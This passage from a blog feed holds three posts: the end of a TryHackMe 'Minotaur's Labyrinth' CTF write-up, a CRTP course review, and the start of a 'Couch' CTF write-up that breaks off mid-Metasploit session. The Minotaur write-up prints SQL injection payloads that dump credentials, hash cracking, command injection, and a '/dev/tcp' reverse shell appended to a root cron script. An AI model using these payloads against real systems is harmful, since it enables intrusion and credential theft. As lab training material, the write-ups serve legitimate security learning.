c = [&quot;c&quot;, &quot;k&quot;, &quot;h&quot;, &quot;p&quot;, &quot;q&quot;, &quot;9&quot;, &quot;w&quot;, &quot;v&quot;, &quot;5&quot;, &quot;p&quot;, &quot;4&quot;]

print(a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8])
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I tried the username and generated password and was able to successfully login to the portal.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/loggedin.png&quot; alt=&quot;loggedin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The webpage has a simple search feature, the table looks like database columns and with the NMAP showing a SQL database its safe to assume this search function will query the database.&lt;/p&gt;

&lt;p&gt;I tested some basic queries and it appears the search function is vulnerable to SQLi. When I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt; character I got an error ‘No callback’ however if I entered &lt;code class=&quot;highlighter-rouge&quot;&gt;';-- -&lt;/code&gt; I don’t get an error which indicates I’m completing the SQL command by commenting out the rest of the query.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/sqlitest.gif&quot; alt=&quot;sqlitest&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because of the output page at the bottom I assumed I could use UNION SELECT to get results from the database and display on the page. There are 3 columns on the page so I tried the UNION SELECT statement &lt;code class=&quot;highlighter-rouge&quot;&gt;' union select 1,2,3;-- -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/sqlidatabase.gif&quot; alt=&quot;sqlidatabase&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So far so good! From the drop down is People &amp;amp; Creatures so rather enumerating for other tables I decided to look at at the columns for these tables with the command&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;'UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name ='people';-- -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/tablecolumns.png&quot; alt=&quot;tablecolumns&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This provided the column names:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;idPeople&lt;/li&gt;
  &lt;li&gt;namePeople&lt;/li&gt;
  &lt;li&gt;passwordPeople&lt;/li&gt;
  &lt;li&gt;permissionPeople&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now with the query &lt;code class=&quot;highlighter-rouge&quot;&gt;'UNION SELECT 1,namePeople,passwordPeople from people;-- -&lt;/code&gt; I could get a list of the names and passwords.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/sqluserlist.png&quot; alt=&quot;sqluserlist&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I also wanted to see the permissions to each person so did another query to get this information, there is probably a way to use group concat to put all the information on one line but I just did a second query.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/peoplepermission.png&quot; alt=&quot;peoplepermission&quot; /&gt;&lt;/p&gt;

&lt;p&gt;M!n0taur is an admin. I put all the names and password hashes in to a file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat peoplecreds 
Eurycliedes:42354020b68c7ed28dcdeabd5a2baf8e
Menekrates:0b3bebe266a81fbfaa79db1604c4e67f
Philostratos:b83f966a6f5a9cff9c6e1c52b0aa635b
Daedalus:b8e4c23686a3a12476ad7779e35f5eb6
M!n0taur:1765db9457f496a39859209ee81fbda4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now using the command &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat -m 0 peoplecreds /usr/share/wordlists/rockyou.txt --username&lt;/code&gt; I can use hashcat to crack the hashes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/crackedusers.png&quot; alt=&quot;crackedusers&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I logged out of the portal and back in with M!n0taur’s credentials and now had admin access.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/adminpage.png&quot; alt=&quot;adminpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A new link is presented ‘Secret Stuff’, navigating to this page give us another input box but this time echoing what ever we enter.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/echopage.png&quot; alt=&quot;echopage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I did some basic tests and using pipe &lt;code class=&quot;highlighter-rouge&quot;&gt;|&lt;/code&gt; allowed me to get command injection. 
&lt;img src=&quot;/assets/images/minotaurslabyrinth/echotest.gif&quot; alt=&quot;echotest&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;With the ability to run commands on the target I tried to get a reverseshell back to my machine, however none of my payloads worked and I got the following message.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/errormessage.png&quot; alt=&quot;errormessage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because I could execute commands, I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; and could see the echo.php page I was trying to exploit, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; to reach the source code and found a regex checking my input.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/regex.gif&quot; alt=&quot;regex&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A good resource for testing regex is &lt;a href=&quot;https://regexr.com&quot;&gt;https://regexr.com&lt;/a&gt;, I put in the expression and could see a range of characters are being matched, all the reverse shell payloads were matching the expression.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/regexcompare.png&quot; alt=&quot;regexcompare&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So so get around this, I encoded my payload as base64, another great resource is &lt;a href=&quot;https://www.revshells.com&quot;&gt;https://www.revshells.com&lt;/a&gt;. Put in your IP and port and you can pick the type of reverse shell you want and then encode it with base64.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/genshell.png&quot; alt=&quot;genshell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used the python3 payload, once thing to note is the regex will check for &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt; so your payload must not need padding once encoded to base64.&lt;/p&gt;

&lt;p&gt;Now with my payloaded encoded, I started a listener and on the echo page I entered &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;base64 string&amp;gt; | base64 -d | bash&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [THMVPNIP] from (UNKNOWN) [10.10.68.118] 41916
bash: /root/.bashrc: Permission denied
daemon@labyrinth:/opt/lampp/htdocs$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I finally had a shell!&lt;/p&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;While enumerating the machine I found a folder called ‘reminders’ which is not a standard folder.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;daemon@labyrinth:/$ ls
ls
bin    home            lost+found  reminders  srv       usr
boot   initrd.img      media       root       swapfile  var
cdrom  initrd.img.old  mnt         run        sys       vmlinuz
dev    lib             opt         sbin       timers    vmlinuz.old
etc    lib64           proc        snap       tmp
daemon@labyrinth:/$ cd reminders
cd reminders
daemon@labyrinth:/reminders$ ls -lah
ls -lah
total 44K
drwxr-xr-x  2 root root 4,0K jún   15 17:25 .
drwxr-xr-x 26 root root 4,0K szept 20 08:42 ..
-rw-r--r--  1 root root  31K nov    7 14:36 dontforget.txt
daemon@labyrinth:/reminders$ date
date
2021. nov. 7., vasárnap, 14:36:07 CET
daemon@labyrinth:/reminders$ 
daemon@labyrinth:/reminders$ tail dontforget.txt
tail dontforget.txt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The ‘dontforget.txt’ file is being regularly updated, thinking back at the text files from the FTP service there is probably a cron job running. Looking around the machine further I found a timers folder.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;daemon@labyrinth:/reminders$ cd /timers
cd /timers
daemon@labyrinth:/timers$ ls
ls
timer.sh
daemon@labyrinth:/timers$ ls -lah timer.sh
ls -lah timer.sh
-rwxrwxrwx 1 root root 117 nov    7 14:38 timer.sh
daemon@labyrinth:/timers$ cat timer.sh
cat timer.sh
#!/bin/bash
echo &quot;dont fo...forge...ttt&quot; &amp;gt;&amp;gt; /reminders/dontforget.txt
daemon@labyrinth:/timers$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is the script adding entries to the text file in the reminders folder and we have full write access. So I appended another reverse shell now calling port 5555.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;daemon@labyrinth:/timers$ echo '/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/THMVPNIP/5555 0&amp;gt;&amp;amp;1' &amp;gt;&amp;gt; timer.sh
&amp;lt;h -i &amp;gt;&amp;amp; /dev/tcp/THMVPNIP/5555 0&amp;gt;&amp;amp;1' &amp;gt;&amp;gt; timer.sh
daemon@labyrinth:/timers$ cat timer.sh
cat timer.sh
#!/bin/bash
echo &quot;dont fo...forge...ttt&quot; &amp;gt;&amp;gt; /reminders/dontforget.txt
/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/THMVPNIP/5555 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Started a listener and waiting for the script to run and got a shell as root!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 5555
listening on [any] 5555 ...
connect to [THMVPNIP] from (UNKNOWN) [10.10.68.118] 38120
bash: cannot set terminal process group (6018): Inappropriate ioctl for device
bash: no job control in this shell
root@labyrinth:~# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="medium" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">CRTP Review</title>
      <link href="https://darrynbrownfield.co.uk/crtp" rel="alternate" type="text/html" title="CRTP Review" />
      <published>2021-10-25T00:00:00+00:00</published>
      <updated>2021-10-25T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/crtp</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/crtp">&lt;p&gt;&lt;img src=&quot;/assets/images/crtp/cover1.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I have recently completed the &lt;a href=&quot;https://www.pentesteracademy.com/activedirectorylab&quot;&gt;Attacking and Defending Active Directory&lt;/a&gt; course from Pentester Academy and wanted to share my thoughts for anyone looking to take the course and take the CTRP exam.&lt;/p&gt;

&lt;p&gt;The course is very beginner friendly, no prior knowledge of attacking active directory or using PowerShell is required. However, I do recommend understanding the basis before the course. Resources like &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; will provide a good overview of basic terminology, privilege escalation and reverse shells etc. At a high-level the course covers:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Domain Enumeration&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation&lt;/li&gt;
  &lt;li&gt;Lateral Movement&lt;/li&gt;
  &lt;li&gt;Domain Persistence&lt;/li&gt;
  &lt;li&gt;Domain Privilege Escalation&lt;/li&gt;
  &lt;li&gt;Cross-Forest Attacks&lt;/li&gt;
  &lt;li&gt;Forest Persistence&lt;/li&gt;
  &lt;li&gt;Detection and Defense&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As part of the course you get all the learning material and access to a AD lab to practice the attacks in a controlled environment. For the lab access you can choose 30, 60 or 90 days of access. I only took 30 days but I think this is plenty to cover all the material and complete the labs but of course it depends on the time you can spend on it. I would spend a few hours a couple of evenings a week and a good 4 or 5 hours on a weekend.&lt;/p&gt;

&lt;h3 id=&quot;the-course&quot;&gt;The Course&lt;/h3&gt;

&lt;p&gt;Once you have registered you will receive access to a portal which provides:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Course videos&lt;/li&gt;
  &lt;li&gt;Course slides&lt;/li&gt;
  &lt;li&gt;Lab guide&lt;/li&gt;
  &lt;li&gt;Lab walk through videos&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You will also be asked when you wish to obtain access to the labs. I think this a great option as some people will prefer to watch everything then focus on the labs. However my methodology was:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Watch the video for a section&lt;/li&gt;
  &lt;li&gt;Read the section slides and notes&lt;/li&gt;
  &lt;li&gt;Complete the learning objective for that section&lt;/li&gt;
  &lt;li&gt;Watch the lab walk through&lt;/li&gt;
  &lt;li&gt;Repeat for the next section&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I preferred to do each section at a time and fully understand it before moving on to the next.&lt;/p&gt;

&lt;p&gt;The course videos are good, I think they are missing some post production flare as its just the instructor with some slides and demos, however that being said the content (which is the important bit really) is fantastic. &lt;a href=&quot;https://twitter.com/nikhil_mitt&quot;&gt;Nikhil Mittal&lt;/a&gt; clearly breaks down each subject and explains each attack and provides a demo of how it works.&lt;/p&gt;

&lt;p&gt;At the end of each learning section is a learning objective to complete in the labs. These are not like the OSCP labs, this environment is to be used with the learning material to try out each attack. Additionally, on the portal is a flag verification tab with questions, the answers are to be discovered whilst completing the labs. These aren’t like CTF hash flags but snippets of information such as ‘NTLM hash of UserX’. While completing the course I had no issues at all with the labs, they are shared with other students but this didn’t cause me any problems.&lt;/p&gt;

&lt;h3 id=&quot;the-exam&quot;&gt;The Exam&lt;/h3&gt;

&lt;p&gt;The exam was fun! You are given 24 hours to enumerate and compromise a AD environment of 5 machines. You are provided with an additional machine to provide a foothold on to the network but that is it. No tools are on the machine, anything you want to use must be first copied over. After the 24 hour period you are given 48 hours to write up your findings and submit a report.&lt;/p&gt;

&lt;p&gt;A couple of days before the exam started, I created the report template and read through all my notes from the course. I use Onenote for note taking, so I created a new section specifically for the exam with a sub section for each machine and some general sections for notes, credentials etc so I could quickly copy and paste details.&lt;/p&gt;

&lt;p&gt;I started the exam at around 11.30, by 15.00 I had managed to gain privesc on the foothold machine and compromise two others but then came hell, machine 3. I was stuck, for hours…… 11 hours later at 02.00 I decided I needed sleep and managed to sleep until 05.00. I was sure I knew how to compromise machines 4 and 5 based on the enumeration I had done but the machines needed to be done in order. However, at 05.30 I had access! I was completely overthinking it, having the break and stepping away allowed me to start again and look it with a fresh (but tired) pair of eyes. By 06.15 I was able to compromise the remaining machines.&lt;/p&gt;

&lt;p&gt;I went though and got all my notes and screenshots so I could create my write up and by 10.00 submitted my report. I got confirmation they received it and would get back to me with result. 6 days passed and then I finally I got the confirmation I passed!&lt;/p&gt;

&lt;h3 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h3&gt;

&lt;p&gt;I highly recommend the course to anyone involved in attack or defending AD. From a offensive perspective the course gives a good understanding of some of the attacks available and hands on experience testing them and moving around a domain. From a defensive perspective, its a must! 30 days is plenty of time to complete all the material and the labs multiple times. The exam is tough but fair and as long as you understand all the course material you can pass the exam.&lt;/p&gt;

&lt;p&gt;Im proud to say I’m now CRTP!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/crtp/cert.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="review" />
      
        <category term="crtp" />
      
        <category term="ad" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Couch Write Up</title>
      <link href="https://darrynbrownfield.co.uk/couch" rel="alternate" type="text/html" title="Couch Write Up" />
      <published>2021-08-13T00:00:00+00:00</published>
      <updated>2021-08-13T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/couch</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/couch">&lt;p&gt;&lt;img src=&quot;/assets/images/couch/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/couch&quot;&gt;couch&lt;/a&gt; is a easy rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://twitter.com/_stuxnet&quot;&gt;stuxnet&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;Although not required I added the machine IP to my host file so through out the write up I can use couch.thm for consistency. Once added I started a nmap scan to check for available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial couch.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-13 14:57 BST
Nmap scan report for couch.thm (10.10.59.151)
Host is up (0.034s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;1 Port open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - OpenSSH 7.2p2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Unless its a bruce force challenge im not going to get far with just that so I also ran a full port scan and found 1 additional port:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p- -oA nmap/allports couch.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-13 14:58 BST
Nmap scan report for couch.thm (10.10.59.151)
Host is up (0.036s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5984/tcp open  couchdb

Nmap done: 1 IP address (1 host up) scanned in 26.86 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I did a final scan using the two ports and ran the -sC &amp;amp; -sV flags to run default scripts and enumerate version.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p 22,5984 -sC -sV -oA nmap/targeted couch.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-13 14:59 BST
Nmap scan report for couch.thm (10.10.59.151)
Host is up (0.031s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;I had never heard of CouchDB so I opened up the web browser to ‘http://couch.thm:5984/’ and took a look.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Apache CouchDB is an open-source document-oriented NoSQL database, implemented in Erlang. CouchDB uses multiple formats and protocols to store, transfer, and process its data. It uses JSON to store data, JavaScript as its query language using MapReduce, and HTTP for an API.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/couch/index.png&quot; alt=&quot;index&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before trying to exploit the service I wanted to understand how it works so I used google to find the &lt;a href=&quot;https://docs.couchdb.org/en/stable/intro/tour.html&quot;&gt;documentation&lt;/a&gt;. From reading the documentation I saw /utils/ provided a web interface.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/couch/adminpage.png&quot; alt=&quot;adminpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With in the ‘secret’ folder I found a username and password.&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;The user credentials provided SSH access to the machine and the user.txt flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh atena@couch.thm
atena@couch.thm's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Fri Aug 13 07:12:25 2021 from &amp;lt;Machine IP&amp;gt;
atena@ubuntu:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;While enumerating the machine I found two additional ports listening on the server 2375 and 38811.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;atena@ubuntu:~$ netstat -ano                                                                  
Active Internet connections (servers and established)                                         
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer         
tcp        0      0 0.0.0.0:5984            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:2375          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:38811         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0    324 10.10.59.151:22         &amp;lt;Machine IP&amp;gt;:54352       ESTABLISHED on (0.07/0/0) 
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
udp        0      0 0.0.0.0:68              0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:38711           0.0.0.0:*                           off (0.00/0/0)
Active UNIX domain sockets (servers and established)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Also when I checked running processes using &lt;code class=&quot;highlighter-rouge&quot;&gt;ps aux&lt;/code&gt;, I found docker was running using one of the ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root       813  0.0  6.5 524372 66484 ?        Ssl  06:52   0:01 /usr/bin/dockerd -H=fd:// -H=tcp://127.0.0.1:2375
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you check the bash history, you can see the user has a ran a docker command to start a docker container. Using this technique you can start a container with the root file system mounted and grab any file you wish.&lt;/p&gt;

&lt;p&gt;However, I wanted to do this one slightly differently. Imagine the user was unable to run docker commands, how else could we use the same technique? The below steps shows how to get the root flag by interacting directly with the service.&lt;/p&gt;

&lt;p&gt;I wanted to be able to interact with the port easily so I used SSH local port forwarding. A great &lt;a href=&quot;https://linuxize.com/post/how-to-setup-ssh-tunneling/&quot;&gt;article&lt;/a&gt; explains how to do this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh -L 2375:localhost:2375 atena@couch.thm                  
                                                                  
atena@couch.thm's password:                                       
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)
                                                                  
 * Documentation:  https://help.ubuntu.com                        
 * Management:     https://landscape.canonical.com                
 * Support:        https://ubuntu.com/advantage                   
Last login: Fri Aug 13 07:12:49 2021 from &amp;lt;Machine IP&amp;gt;             
atena@ubuntu:~$                                                   
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I can interact with the port by going to ‘localhost:2375’. A great resource for tips and techniques is &lt;a href=&quot;https://book.hacktricks.xyz/pentesting/2375-pentesting-docker&quot;&gt;HackTricks&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Remote API is running by default on 2375 port when enabled. The service by default will not require authentication allowing an attacker to start a privileged docker container. By using the Remote API one can attach hosts / (root directory) to the container and read/write files of the host’s environment.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If I had docker installed on my local machine I could use this to run docker commands on the remote service using the -H flag but I dont, we could also use CURL. However Metasploit is easier.&lt;/p&gt;

&lt;p&gt;I fired up Metasploit and searched docker.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 &amp;gt; search docker

Matching Modules
================

   #   Name                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                      ---------------  ----       -----  -----------
   0   exploit/linux/http/dcos_marathon                          2017-03-03       excellent  Yes    DC/OS Marathon UI Docker Exploit
   1   exploit/linux/local/docker_runc_escape                    2019-01-01       manual     No     Docker Container Escape Via runC Overwrite
   2   exploit/linux/http/docker_daemon_tcp                      2017-07-25       excellent  Yes    Docker Daemon - Unprotected TCP Socket Exploit
   3   exploit/linux/local/docker_daemon_privilege_escalation    2016-06-28       excellent  Yes    Docker Daemon Privilege Escalation
   4   exploit/linux/local/docker_privileged_container_escape    2019-07-17       normal     Yes    Docker Privileged Container Escape
   5   auxiliary/scanner/http/docker_version                                      normal     No     Docker Server Version Scanner
   6   exploit/windows/local/docker_credential_wincred           2019-07-05       manual     Yes    Docker-Credential-Wincred.exe Privilege Escalation
   7   exploit/multi/http/gitea_git_hooks_rce                    2020-10-07       excellent  Yes    Gitea Git Hooks Remote Code Execution
   8   exploit/multi/http/gogs_git_hooks_rce                     2020-10-07       excellent  Yes    Gogs Git Hooks Remote Code Execution
   9   post/linux/gather/enum_containers                                          normal     No     Linux Container Enumeration
   10  post/linux/gather/checkcontainer                                           normal     No     Linux Gather Container Detection
   11  auxiliary/admin/mssql/mssql_idf                                            normal     No     Microsoft SQL Server Interesting Data Finder
   12  post/multi/gather/docker_creds                                             normal     No     Multi Gather Docker Credentials Collection
   13  exploit/linux/http/rancher_server                         2017-07-27       excellent  Yes    Rancher Server - Docker Exploit
   14  auxiliary/gather/saltstack_salt_root_key                  2020-04-30       normal     No     SaltStack Salt Master Server Root Key Disclosure
   15  exploit/linux/misc/saltstack_salt_unauth_rce              2020-04-30       great      Yes    SaltStack Salt Master/Minion Unauthenticated RCE
   16  exploit/linux/http/vmware_view_planner_4_6_uploadlog_rce  2021-03-02       excellent  Yes    VMware View Planner Unauthenticated Log File Upload RCE


Interact with a module by name or index. For example info 16, use 16 or use exploit/linux/http/vmware_view_planner_4_6_uploadlog_rce

msf6 &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;‘exploit/linux/http/docker_daemon_tcp’ looks perfect.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 &amp;gt; use 2
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; set rhost localhost
rhost =&amp;gt; localhost
